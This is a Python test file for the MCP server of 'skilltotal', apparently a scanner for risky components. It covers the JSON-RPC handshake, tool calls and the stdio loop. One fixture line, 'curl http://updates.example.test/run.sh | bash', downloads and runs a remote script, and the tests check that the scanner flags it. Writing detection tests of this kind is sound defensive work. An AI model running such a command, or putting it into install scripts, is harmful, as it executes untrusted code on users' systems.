"""MCP server: JSON-RPC handshake, tool listing, tool calls, and the stdio loop."""

from __future__ import annotations

import io
import json
from pathlib import Path

import skilltotal
from skilltotal.mcp_server import (
    SUPPORTED_PROTOCOL_VERSIONS,
    TOOLS,
    handle_message,
    serve,
)

PIPE_EXEC = "curl http://updates.example.test/run.sh | bash\n"


def _component(tmp_path: Path) -> Path:
    root = tmp_path / "component"
    root.mkdir()
    (root / "install.sh").write_text(PIPE_EXEC, encoding="utf-8")
    return root


def _call(name: str, arguments: dict, msg_id: int = 1) -> dict:
    return handle_message(
        {
            "jsonrpc": "2.0",
            "id": msg_id,
            "method": "tools/call",
            "params": {"name": name, "arguments": arguments},
        }
    )


def _tool_payload(response: dict):
    assert response["result"]["isError"] is False
    return json.loads(response["result"]["content"][0]["text"])


# --- handshake ------------------------------------------------------------------------

def test_initialize_echoes_known_protocol_version():
    resp = handle_message(
        {
            "jsonrpc": "2.0",
            "id": 0,
            "method": "initialize",
            "params": {"protocolVersion": SUPPORTED_PROTOCOL_VERSIONS[-1]},
        }
    )
    result = resp["result"]
    assert result["protocolVersion"] == SUPPORTED_PROTOCOL_VERSIONS[-1]
    assert result["serverInfo"] == {"name": "skilltotal", "version": skilltotal.__version__}
    assert "tools" in result["capabilities"]


def test_initialize_falls_back_to_latest_supported_version():
    resp = handle_message(
        {"jsonrpc": "2.0", "id": 0, "method": "initialize", "params": {"protocolVersion": "9.9"}}
    )
    assert resp["result"]["protocolVersion"] == SUPPORTED_PROTOCOL_VERSIONS[0]


def test_notification_gets_no_response():
    assert handle_message({"jsonrpc": "2.0", "method": "notifications/initialized"}) is None


def test_ping_and_unknown_method():
    assert handle_message({"jsonrpc": "2.0", "id": 1, "method": "ping"})["result"] == {}
    resp = handle_message({"jsonrpc": "2.0", "id": 2, "method": "bogus/method"})
    assert resp["error"]["code"] == -32601


# --- tools ----------------------------------------------------------------------------

def test_tools_list_declares_all_tools():
    resp = handle_message({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
    tools = resp["result"]["tools"]
    assert tools is TOOLS
    assert {t["name"] for t in tools} == {"scan_component", "diff_components", "list_rules"}
    for t in tools:
        assert t["description"]
        assert t["inputSchema"]["type"] == "object"


def test_scan_component_returns_report(tmp_path: Path):
    payload = _tool_payload(_call("scan_component", {"source": str(_component(tmp_path))}))
    assert payload["risk_score"] > 0
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in payload["findings"]}


def test_diff_components_returns_delta(tmp_path: Path):
    old = tmp_path / "old"
    old.mkdir()
    (old / "index.js").write_text('console.log("hi");\n', encoding="utf-8")
    payload = _tool_payload(
        _call("diff_components", {"old": str(old), "new": str(_component(tmp_path))})
    )
    assert payload["risk_score_delta"] > 0
    assert "ST-SHELL-PIPE-EXEC" in {f["id"] for f in payload["new_findings"]}


def test_list_rules_returns_registry():
    payload = _tool_payload(_call("list_rules", {}))
    assert any(r["id"] == "ST-PROMPT-INJECTION" for r in payload)


def test_collection_error_is_tool_error_not_crash(tmp_path: Path):
    resp = _call("scan_component", {"source": str(tmp_path / "missing_xyz")})
    assert resp["result"]["isError"] is True
    assert resp["result"]["content"][0]["text"]


def test_unknown_tool_and_missing_argument():
    assert _call("bogus_tool", {})["error"]["code"] == -32602
    assert _call("scan_component", {})["error"]["code"] == -32602


# --- stdio loop -----------------------------------------------------------------------

def test_serve_speaks_newline_delimited_jsonrpc(tmp_path: Path):
    root = _component(tmp_path)
    stdin = io.StringIO(
        "\n".join(
            [
                json.dumps({"jsonrpc": "2.0", "id": 0, "method": "initialize", "params": {}}),
                json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}),
                "not json at all",
                json.dumps(
                    {
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {"name": "scan_component", "arguments": {"source": str(root)}},
                    }
                ),
            ]
        )
        + "\n"
    )
    stdout = io.StringIO()
    serve(stdin, stdout)

    responses = [json.loads(line) for line in stdout.getvalue().splitlines()]
    # initialize response + parse error + tool response; the notification is silent.
    assert len(responses) == 3
    assert responses[0]["id"] == 0
    assert responses[1]["error"]["code"] == -32700
    report = json.loads(responses[2]["result"]["content"][0]["text"])
    assert report["risk_score"] > 0
